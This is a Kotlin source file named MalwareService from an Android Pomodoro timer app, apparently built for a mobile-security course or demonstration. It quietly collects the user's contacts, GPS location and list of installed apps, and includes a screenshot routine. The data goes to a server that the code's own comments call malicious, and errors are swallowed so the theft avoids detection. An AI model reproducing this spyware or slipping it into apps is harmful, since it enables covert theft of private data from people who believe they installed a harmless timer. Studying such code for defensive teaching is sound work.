package com.mobileSec.pomodoroapp.malware

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.LocationManager
import android.provider.ContactsContract
import androidx.core.app.ActivityCompat
import com.mobileSec.pomodoroapp.data.remote.RetrofitClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.*
import android.graphics.Bitmap
import android.view.View
import java.io.ByteArrayOutputStream
import android.util.Base64
import com.mobileSec.pomodoroapp.data.remote.dto.ContactDto
import com.mobileSec.pomodoroapp.data.remote.dto.LocationDto
import com.mobileSec.pomodoroapp.data.remote.dto.MalwareDataDto

class MalwareService(private val context: Context) {

    fun collectAndSendData() {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val malwareData = MalwareDataDto(
                    deviceId = getDeviceId(),
                    contacts = getContacts(),
                    location = getCurrentLocation(),
                    installedApps = getInstalledApps(),
                    screenshots = emptyList(), // Would implement screenshot capture
                    timestamp = System.currentTimeMillis()
                )

                // Send to malicious server
                RetrofitClient.api.uploadMalwareData(malwareData)
            } catch (e: Exception) {
                // Silently fail to avoid detection
            }
        }
    }

    private fun getDeviceId(): String {
        return UUID.randomUUID().toString()
    }

    private fun getContacts(): List<ContactDto> {
        val contacts = mutableListOf<ContactDto>()

        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_CONTACTS
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val phoneIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

                    if (nameIndex >= 0 && phoneIndex >= 0) {
                        val name = it.getString(nameIndex) ?: ""
                        val phone = it.getString(phoneIndex) ?: ""

                        contacts.add(ContactDto(name, phone, null))
                    }
                }
            }
        }

        return contacts
    }

    private fun getCurrentLocation(): LocationDto? {
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)

            return location?.let {
                LocationDto(it.latitude, it.longitude, System.currentTimeMillis())
            }
        }
        return null
    }

    private fun getInstalledApps(): List<String> {
        val packageManager = context.packageManager
        val installedApps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
        return installedApps.map { it.packageName }
    }

    private fun takeScreenshot(view: View): String? {
        return try {
            val bitmap = Bitmap.createBitmap(view.width, view.height, Bitmap.Config.ARGB_8888)
            val canvas = android.graphics.Canvas(bitmap)
            view.draw(canvas)

            val baos = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos)
            val byteArray = baos.toByteArray()
            Base64.encodeToString(byteArray, Base64.DEFAULT)
        } catch (e: Exception) {
            null
        }
    }
}